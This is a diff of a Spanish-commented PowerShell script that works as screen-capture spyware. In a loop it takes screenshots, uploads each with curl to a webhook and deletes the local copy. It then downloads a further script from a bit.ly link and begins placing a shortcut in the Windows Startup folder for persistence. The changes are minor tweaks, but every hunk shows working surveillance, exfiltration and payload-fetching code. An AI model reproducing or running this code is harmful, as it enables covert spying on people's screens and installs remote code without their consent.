@@ -4,7 +4,7 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
 
 do {
     $Filett = "$env:temp\SC.png"
@@ -22,7 +22,7 @@ do {
     Start-Sleep 1
     curl.exe -F "file1=@$filett" $hookurl
     Start-Sleep 1
-    Remove-Item -Path $filett
+    Remove-Item -Path $filett -Force
     Start-Sleep $seconds
 
     # Incrementar contador de imágenes enviadas al webhook
@@ -33,7 +33,7 @@ do {
         # Descargar el script principal
         $syswUrl = "https://bit.ly/Screen_dc"
         $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath -Force
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
         
         # Crear acceso directo en la carpeta de inicio del usuario
         $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
